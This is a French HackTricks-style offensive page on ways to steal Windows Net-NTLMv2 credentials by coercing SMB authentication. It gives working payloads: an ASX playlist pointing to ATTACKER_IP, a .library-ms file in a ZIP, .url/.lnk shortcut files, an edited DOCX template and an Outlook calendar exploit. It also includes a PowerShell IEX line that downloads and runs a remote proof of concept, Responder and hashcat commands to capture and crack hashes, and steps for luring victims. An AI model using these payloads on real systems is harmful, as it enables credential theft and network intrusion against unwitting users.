# Endroits pour voler NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Consultez toutes les excellentes idées de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) depuis le téléchargement d'un fichier microsoft word en ligne jusqu'à la source ntlm leaks : https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md et [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Listes de lecture Windows Media Player (.ASX/.WAX)

Si vous pouvez amener une cible à ouvrir ou prévisualiser une playlist Windows Media Player que vous contrôlez, vous pouvez leak Net‑NTLMv2 en pointant l'entrée vers un chemin UNC. WMP tentera de récupérer le média référencé via SMB et s'authentifiera implicitement.

Exemple payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flux de collecte et de cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

L'Explorateur Windows gère de manière non sécurisée les fichiers .library-ms lorsqu'ils sont ouverts directement depuis une archive ZIP. Si la définition de la library pointe vers un chemin UNC distant (par ex., \\attacker\share), le simple fait de parcourir/lancer le .library-ms à l'intérieur du ZIP entraîne l'Explorateur à énumérer le UNC et à émettre une authentification NTLM vers l'attaquant. Cela génère un NetNTLMv2 qui peut être craqué hors ligne ou potentiellement relayé.

Exemple minimal de .library-ms pointant vers un UNC contrôlé par l'attaquant
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Étapes opérationnelles
- Créez le fichier .library-ms avec le XML ci‑dessus (réglez votre IP/hostname).
- Compressez-le (sous Windows : Send to → Compressed (zipped) folder) et transmettez le ZIP à la cible.
- Lancez un listener de capture NTLM et attendez que la victime ouvre le .library-ms depuis le ZIP.

### Outlook calendar reminder sound path (CVE-2023-23397) – zéro‑clic Net‑NTLMv2 leak

Microsoft Outlook for Windows traitait la propriété MAPI étendue PidLidReminderFileParameter dans les éléments de calendrier. Si cette propriété pointe vers un chemin UNC (e.g., \\attacker\share\alert.wav), Outlook contactait le partage SMB lorsque le rappel se déclenchait, provoquant le leak du Net‑NTLMv2 de l’utilisateur sans aucun clic. Cela a été corrigé le 14 mars 2023, mais c'est toujours très pertinent pour les flottes legacy/untouched et pour la réponse aux incidents historiques.

Exploitation rapide avec PowerShell (Outlook COM) :
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Côté Listener :
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Remarques
- Une victime n'a besoin que d'Outlook for Windows en cours d'exécution lorsque le rappel se déclenche.
- Le leak fournit Net‑NTLMv2 utilisables pour offline cracking ou relay (pas pour pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer rend automatiquement les icônes des raccourcis. Des recherches récentes ont montré que, même après le patch d'avril 2025 de Microsoft pour les icônes UNC, il était encore possible de déclencher l'authentification NTLM sans aucun clic en hébergeant la cible du raccourci sur un UNC path et en gardant l'icône locale (patch bypass assigned CVE‑2025‑50154). Le simple fait d'afficher le dossier amène Explorer à récupérer des métadonnées depuis la cible distante, émettant des NTLM vers le serveur SMB de l'attaquant.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de raccourci de programme (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Idées de diffusion
- Déposez le raccourci dans un ZIP et incitez la victime à le parcourir.
- Placez le raccourci sur un partage en écriture que la victime ouvrira.
- Combinez avec d'autres fichiers d'appât dans le même dossier pour que l'Explorer prévisualise les éléments.


### Office remote template injection (.docx/.dotm) pour contraindre l'authentification NTLM

Les documents Office peuvent référencer un modèle externe. Si vous définissez le modèle joint sur un chemin UNC, l'ouverture du document s'authentifiera sur SMB.

Modifications minimales des relationships DOCX (dans word/):

1) Éditez word/settings.xml et ajoutez la référence au modèle joint :
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifiez word/_rels/settings.xml.rels et pointez rId1337 vers votre UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repaqueter en .docx et livrer. Lancez votre listener de capture SMB et attendez l'ouverture.

Après la capture, pour des idées sur le relaying ou l'abus de NTLM, consultez :

{{#ref}}
README.md
{{#endref}}


## Références
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
